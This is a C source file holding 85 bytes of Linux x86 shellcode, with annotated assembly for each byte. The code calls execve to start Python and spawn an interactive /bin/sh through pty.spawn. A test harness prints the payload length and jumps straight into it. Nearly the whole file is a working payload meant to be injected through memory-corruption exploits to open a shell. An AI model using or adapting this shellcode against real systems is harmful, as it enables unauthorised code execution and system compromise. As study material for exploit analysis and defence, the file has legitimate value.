/*
	Title:  execve python(sh) shellcode (85 bytes)
	Author: blindarcher <blindarcher[no SPAM]outlook dot com>
	Arch:   Linux x86
	Prototype: execve("/usr/bin/python", ["/usr/bin/python", "-c", "import pty; pty.spawn('/bin/sh')"], NULL);
*/

char shellcode[]=
   	"\x6a\x0b"              // push   $0xb			<-- put the #0xb syscall into stack
	"\x58"                  // pop    %eax			<-- pop the #0xb syscall into eax register
	"\x99"					// cltd					<-- put the zero valor into eax and edx registers
	"\x52"					// push   %edx			<-- put the eax register valor into stack (zero)
  	"\x68\x73\x68\x27\x29"  // push   $0x29276873	<-- put the string "sh')" into stack
  	"\x68\x62\x69\x6e\x2f"  // push   $0x2f6e6962	<-- put the string "bin/" into stack
   	"\x68\x6e\x28\x27\x2f"  // push   $0x2f27286e	<-- put the string "n('/" into stack
  	"\x68\x73\x70\x61\x77"  // push   $0x77617073	<-- put the string "spaw" into stack
  	"\x68\x70\x74\x79\x2e"  // push   $0x2e797470	<-- put the string "pty." into stack
  	"\x68\x74\x79\x3b\x20"  // push   $0x203b7974	<-- put the string "ty; " into stack
  	"\x68\x72\x74\x20\x70"  // push   $0x70207472	<-- put the string "rt p" into stack
  	"\x68\x69\x6d\x70\x6f"  // push   $0x6f706d69	<-- put the string "impo" into stack
  	"\x89\xe6"              // mov    %esp,%esi		<-- copy esp valor into esi
  	"\x52"                  // push   %edx			<-- put the eax register valor into stack (zero)
  	"\x66\x68\x2d\x63"      // pushw  $0x632d		<-- put the string "-c" into stack
  	"\x89\xe1"              // mov    %esp,%ecx		<-- copy esp valor into ecx
  	"\x52"                  // push   %edx			<-- put the eax register valor into stack (zero)
  	"\x68\x74\x68\x6f\x6e"  // push   $0x6e6f6874	<-- put the string "thon" into stack
  	"\x68\x6e\x2f\x70\x79"  // push   $0x79702f6e	<-- put the string "n/py" into stack
  	"\x68\x72\x2f\x62\x69"  // push   $0x69622f72	<-- put the string "r/bi" into stack
  	"\x68\x2f\x2f\x75\x73"  // push   $0x73752f2f	<-- put the string "//us" into stack
  	"\x89\xe3"              // mov    %esp,%ebx		<-- copy esp valor into ebx
  	"\x52"                  // push   %edx			<-- put the eax register valor into stack (zero)
  	"\x56"                  // push   %esi			<-- put the esi valor into stack
  	"\x51"                  // push   %ecx			<-- put the ecx valor into stack
  	"\x53"                  // push   %ebx			<-- put the ebx valor into stack
  	"\x89\xe1"              // mov    %esp,%ecx		<-- copy esp valor into ecx
  	"\xcd\x80";             // int    $0x80			<-- call the kernel

main()
{
    printf("Shellcode lenght: %d bytes\n", strlen(shellcode));
    asm("jmp shellcode");	// jump to shellcode	<-- Thanks M0nad!
}
